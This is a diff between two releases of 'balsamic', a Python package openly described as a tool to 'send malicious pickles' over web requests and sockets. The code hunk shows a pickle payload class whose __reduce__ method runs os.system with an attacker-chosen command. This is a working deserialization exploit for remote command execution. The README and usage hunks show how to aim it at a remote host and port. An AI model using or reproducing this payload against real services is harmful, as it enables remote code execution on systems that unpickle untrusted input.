# Comparing `tmp/balsamic-0.1.95.tar.gz` & `tmp/balsamic-0.1.96.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "balsamic-0.1.95.tar", last modified: Sat May 18 03:01:14 2024, max compression
+gzip compressed data, was "balsamic-0.1.96.tar", last modified: Sat May 18 03:05:06 2024, max compression
```

## Comparing `balsamic-0.1.95.tar` & `balsamic-0.1.96.tar`

### file list

```diff
@@ -1,15 +1,15 @@
-drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-18 03:01:14.412780 balsamic-0.1.95/
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2139 2024-05-18 03:01:14.412780 balsamic-0.1.95/PKG-INFO
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1604 2024-05-17 23:29:20.000000 balsamic-0.1.95/README.md
-drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-18 03:01:14.412780 balsamic-0.1.95/balsamic/
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        1 2024-05-17 19:32:39.000000 balsamic-0.1.95/balsamic/__innit__.py
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2226 2024-05-18 02:50:42.000000 balsamic-0.1.95/balsamic/__main__.py
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1739 2024-05-18 03:00:48.000000 balsamic-0.1.95/balsamic/balsamic.py
-drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-18 03:01:14.412780 balsamic-0.1.95/balsamic.egg-info/
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2139 2024-05-18 03:01:14.000000 balsamic-0.1.95/balsamic.egg-info/PKG-INFO
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)      241 2024-05-18 03:01:14.000000 balsamic-0.1.95/balsamic.egg-info/SOURCES.txt
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        1 2024-05-18 03:01:14.000000 balsamic-0.1.95/balsamic.egg-info/dependency_links.txt
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        9 2024-05-18 03:01:14.000000 balsamic-0.1.95/balsamic.egg-info/requires.txt
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        9 2024-05-18 03:01:14.000000 balsamic-0.1.95/balsamic.egg-info/top_level.txt
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)       38 2024-05-18 03:01:14.412780 balsamic-0.1.95/setup.cfg
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1144 2024-05-18 03:00:57.000000 balsamic-0.1.95/setup.py
+drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-18 03:05:06.691889 balsamic-0.1.96/
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2237 2024-05-18 03:05:06.691889 balsamic-0.1.96/PKG-INFO
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1702 2024-05-18 03:04:59.000000 balsamic-0.1.96/README.md
+drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-18 03:05:06.691889 balsamic-0.1.96/balsamic/
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        1 2024-05-17 19:32:39.000000 balsamic-0.1.96/balsamic/__innit__.py
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2226 2024-05-18 02:50:42.000000 balsamic-0.1.96/balsamic/__main__.py
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1759 2024-05-18 03:03:14.000000 balsamic-0.1.96/balsamic/balsamic.py
+drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-18 03:05:06.691889 balsamic-0.1.96/balsamic.egg-info/
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2237 2024-05-18 03:05:06.000000 balsamic-0.1.96/balsamic.egg-info/PKG-INFO
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)      241 2024-05-18 03:05:06.000000 balsamic-0.1.96/balsamic.egg-info/SOURCES.txt
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        1 2024-05-18 03:05:06.000000 balsamic-0.1.96/balsamic.egg-info/dependency_links.txt
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        9 2024-05-18 03:05:06.000000 balsamic-0.1.96/balsamic.egg-info/requires.txt
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        9 2024-05-18 03:05:06.000000 balsamic-0.1.96/balsamic.egg-info/top_level.txt
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)       38 2024-05-18 03:05:06.691889 balsamic-0.1.96/setup.cfg
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1144 2024-05-18 03:03:18.000000 balsamic-0.1.96/setup.py
```

### Comparing `balsamic-0.1.95/PKG-INFO` & `balsamic-0.1.96/PKG-INFO`

 * *Files 4% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: balsamic
-Version: 0.1.95
+Version: 0.1.96
 Summary: Send malicious pickles via requests or sockets
 Author: Witchdoctor (malectrica)
 Keywords: python,hack,pickle,serialization,security,sockets,web
 Classifier: Development Status :: 5 - Production/Stable
 Classifier: Intended Audience :: Developers
 Classifier: Programming Language :: Python :: 3
 Classifier: Operating System :: Unix
@@ -40,27 +40,30 @@
 options:
   -h, --help            show this help message and exit
   -rh RHOST, --rhost RHOST
   -rp RPORT, --rport RPORT
   -P PAYLOAD, --payload PAYLOAD
   -c COMMAND, --command COMMAND
   -s STEPS, --steps STEPS
+  -e ENCODE, --encode Encode
 ```
 socklisten mode
 ```
 usage: balsamic.py socklisten [-h] -lp LPORT -P PAYLOAD [-c COMMAND]
 
 options:
   -h, --help            show this help message and exit
   -lp LPORT, --lport LPORT
   -P PAYLOAD, --payload PAYLOAD
   -c COMMAND, --command COMMAND
+  -s STEPS, --steps STEPS
+  -e ENCODE, --encode Encode
 ```
 
 ## useage (library)
 ```
 from balsamic import balsamic
 balsamic.utility.command="command"
 balsamic.webreq("schema","method","rhost","rport","payload","parameter","cookie")
-balsamic.socksend("ip",port,"payload",steps)
-balsamic.socklisten(port,"payload",steps)
+balsamic.socksend("ip",port,"payload",encode,steps)
+balsamic.socklisten(port,"payload",encode,steps)
 ```
```

### Comparing `balsamic-0.1.95/README.md` & `balsamic-0.1.96/README.md`

 * *Files 18% similar despite different names*

```diff
@@ -25,27 +25,30 @@
 options:
   -h, --help            show this help message and exit
   -rh RHOST, --rhost RHOST
   -rp RPORT, --rport RPORT
   -P PAYLOAD, --payload PAYLOAD
   -c COMMAND, --command COMMAND
   -s STEPS, --steps STEPS
+  -e ENCODE, --encode Encode
 ```
 socklisten mode
 ```
 usage: balsamic.py socklisten [-h] -lp LPORT -P PAYLOAD [-c COMMAND]
 
 options:
   -h, --help            show this help message and exit
   -lp LPORT, --lport LPORT
   -P PAYLOAD, --payload PAYLOAD
   -c COMMAND, --command COMMAND
+  -s STEPS, --steps STEPS
+  -e ENCODE, --encode Encode
 ```
 
 ## useage (library)
 ```
 from balsamic import balsamic
 balsamic.utility.command="command"
 balsamic.webreq("schema","method","rhost","rport","payload","parameter","cookie")
-balsamic.socksend("ip",port,"payload",steps)
-balsamic.socklisten(port,"payload",steps)
+balsamic.socksend("ip",port,"payload",encode,steps)
+balsamic.socklisten(port,"payload",encode,steps)
 ```
```

### Comparing `balsamic-0.1.95/balsamic/__main__.py` & `balsamic-0.1.96/balsamic/__main__.py`

 * *Files identical despite different names*

### Comparing `balsamic-0.1.95/balsamic/balsamic.py` & `balsamic-0.1.96/balsamic/balsamic.py`

 * *Files 2% similar despite different names*

```diff
@@ -9,14 +9,15 @@
 
 	def b64pickle(payload):
 		p=getattr(payloads,payload)
 		p=base64.b64encode(pickle.dumps(p()))
 		return p
 	def plainpickle(payload):
 		p=getattr(payloads,payload)
+		p=pickle.dumps(p)
 		return p
 
 class payloads:
 	class oscmd:
 		def __reduce__(self):
 			import os
 			return (os.system, (utility.command,))
```

### Comparing `balsamic-0.1.95/balsamic.egg-info/PKG-INFO` & `balsamic-0.1.96/balsamic.egg-info/PKG-INFO`

 * *Files 4% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: balsamic
-Version: 0.1.95
+Version: 0.1.96
 Summary: Send malicious pickles via requests or sockets
 Author: Witchdoctor (malectrica)
 Keywords: python,hack,pickle,serialization,security,sockets,web
 Classifier: Development Status :: 5 - Production/Stable
 Classifier: Intended Audience :: Developers
 Classifier: Programming Language :: Python :: 3
 Classifier: Operating System :: Unix
@@ -40,27 +40,30 @@
 options:
   -h, --help            show this help message and exit
   -rh RHOST, --rhost RHOST
   -rp RPORT, --rport RPORT
   -P PAYLOAD, --payload PAYLOAD
   -c COMMAND, --command COMMAND
   -s STEPS, --steps STEPS
+  -e ENCODE, --encode Encode
 ```
 socklisten mode
 ```
 usage: balsamic.py socklisten [-h] -lp LPORT -P PAYLOAD [-c COMMAND]
 
 options:
   -h, --help            show this help message and exit
   -lp LPORT, --lport LPORT
   -P PAYLOAD, --payload PAYLOAD
   -c COMMAND, --command COMMAND
+  -s STEPS, --steps STEPS
+  -e ENCODE, --encode Encode
 ```
 
 ## useage (library)
 ```
 from balsamic import balsamic
 balsamic.utility.command="command"
 balsamic.webreq("schema","method","rhost","rport","payload","parameter","cookie")
-balsamic.socksend("ip",port,"payload",steps)
-balsamic.socklisten(port,"payload",steps)
+balsamic.socksend("ip",port,"payload",encode,steps)
+balsamic.socklisten(port,"payload",encode,steps)
 ```
```

### Comparing `balsamic-0.1.95/setup.py` & `balsamic-0.1.96/setup.py`

 * *Files 10% similar despite different names*

```diff
@@ -3,15 +3,15 @@
 import os
 
 here = os.path.abspath(os.path.dirname(__file__))
 
 with codecs.open(os.path.join(here, "README.md"), encoding="utf-8") as fh:
     long_description = "\n" + fh.read()
 
-VERSION = '0.1.95'
+VERSION = '0.1.96'
 DESCRIPTION = 'Send malicious pickles via requests or sockets'
 LONG_DESCRIPTION = 'A package that allows the user to easily send out malicious pickles, via web requests, or a malicious server or client(currently ipv4 only)'
 
 # Setting up
 setup(
     name="balsamic",
     version=VERSION,
```

